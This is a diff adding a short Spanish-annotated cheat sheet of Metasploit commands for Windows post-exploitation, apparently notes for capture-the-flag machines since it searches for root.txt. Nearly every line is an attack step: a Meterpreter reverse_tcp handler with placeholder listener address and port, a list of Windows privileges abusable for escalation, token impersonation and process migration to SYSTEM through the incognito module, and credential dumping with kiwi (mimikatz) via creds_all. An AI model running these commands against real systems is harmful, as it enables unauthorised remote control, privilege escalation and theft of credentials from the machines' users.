@@ -1,0 +1,34 @@
+# cmd
+getsystem
+search -f root.txt
+
+# handler
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST IP-A 
+set LPORT PORT-A
+run
+
+# impersonate token
+privilegios:
+SeImpersonatePrivilege
+SeAssignPrimaryPrivilege
+SeTcbPrivilege
+SeBackupPrivilege
+SeRestorePrivilege
+SeCreateTokenPrivilege
+SeLoadDriverPrivilege
+SeTakeOwnershipPrivilege
+SeDebugPrivilege
+
+# modulo incognito
+M> load incognito
+M> list_tokens -g
+M> impersonate_token "USER\GROUP"
+M> getuid
+M> ps
+M> migrate PID (services.exe --> servicio corriendo como NT AUTHORIY\SYSTEM)
+
+# modulo mimikatz
+M> load kiwi
+M> creds_all
